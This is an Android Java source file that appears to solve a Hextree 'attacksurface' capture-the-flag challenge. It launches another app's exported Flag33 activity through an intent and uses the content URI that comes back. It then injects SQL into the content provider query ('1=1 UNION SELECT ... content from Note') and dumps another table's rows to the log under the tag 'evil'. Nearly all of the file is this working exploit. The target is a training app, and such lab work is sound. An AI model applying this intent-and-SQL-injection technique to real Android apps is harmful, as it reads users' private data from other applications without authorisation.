package niraj.patali.contentprovideraccsswithintent;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {

    private static final int REQUEST_CODE_FLAG33 = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Interact with Flag33Activity1 on launch
        interactWithFlag33Activity();
    }

    private void interactWithFlag33Activity() {
        // Create the intent to interact with Flag33Activity1
        Intent intent = new Intent("io.hextree.FLAG33");
        intent.setClassName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag33Activity1");
//        intent.setData(Uri.parse("content://io.hextree.flag33_1/flag"));
//        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        // Start Flag33Activity1 and expect a result
        startActivityForResult(intent, REQUEST_CODE_FLAG33);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_CODE_FLAG33 && resultCode == RESULT_OK && data != null) {
            // Get the returned URI from the Intent
            Uri returnedUri = data.getData();

            if (returnedUri != null) {
                System.out.println("Returned URI: " + returnedUri.toString());
                // Access the provider data using the returned URI
                accessProviderData(returnedUri);
            } else {
                System.err.println("No data returned from Flag33Activity1.");
            }
        }
    }

    private void accessProviderData(Uri uri) {
        ContentResolver resolver = getContentResolver();

        try (Cursor cursor = resolver.query(uri,  null,  " 1=1 UNION SELECT NULL, NULL, NULL, content from Note", null, null)) {if (cursor!=null && cursor.moveToFirst()) {
            do {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < cursor.getColumnCount(); i++) {
                    if (sb.length() > 0) {
                        sb.append(", ");
                    }
                    sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
                }
                Log.d("evil", sb.toString());
            } while (cursor.moveToNext());
        }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
